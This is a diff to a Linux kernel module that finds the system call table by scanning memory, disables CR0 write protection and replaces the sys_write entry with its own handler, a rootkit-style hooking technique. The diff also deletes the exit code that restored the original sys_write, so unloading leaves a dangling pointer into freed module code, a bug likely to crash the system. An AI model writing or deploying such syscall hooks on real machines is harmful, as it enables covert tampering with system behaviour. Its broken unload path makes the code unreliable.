@@ -18,7 +18,6 @@ MODULE_LICENSE("Dual MIT/GPL");
 
 unsigned long original_cr0;
 unsigned long *sys_write_address;
-unsigned long **sct;
 
 asmlinkage long (* orig_write) (int fd, const char __user *buf, size_t count);
 
@@ -30,6 +29,7 @@ asmlinkage long new_write(int fd, const char __user *buf, size_t count)
 
 static unsigned long **find_address_sct(void)
 {
+	unsigned long **sct;
 	unsigned long offset = PAGE_OFFSET;
 
 	while (offset < ULLONG_MAX) {
@@ -95,6 +95,7 @@ static int find_address_write(void)
 
 static int __init loader(void)
 {
+	unsigned long **sct;
 	original_cr0 = read_cr0();
 
 	write_cr0(original_cr0 & ~0x10000);
@@ -107,7 +108,7 @@ static int __init loader(void)
 	} else {
 		printk(KERN_INFO "HOLY SHIT BOIIII\n");
 	}
-	printk(KERN_INFO "lol: %lx\n", (long unsigned) sct[__NR_write]);
+	printk("LOL!\n");
 	orig_write = (long) sct[__NR_write];
 	sct[__NR_write] = (unsigned long *)new_write;
 	write_cr0(original_cr0);
@@ -116,9 +117,6 @@ static int __init loader(void)
 
 static void __exit reset(void)
 {
-	write_cr0(original_cr0 & ~0x10000);
-	sct[__NR_write] = (unsigned long *) orig_write;
-	write_cr0(original_cr0);
 	printk(KERN_INFO "Unloaded %s\n", MODULENAME);
 }
 
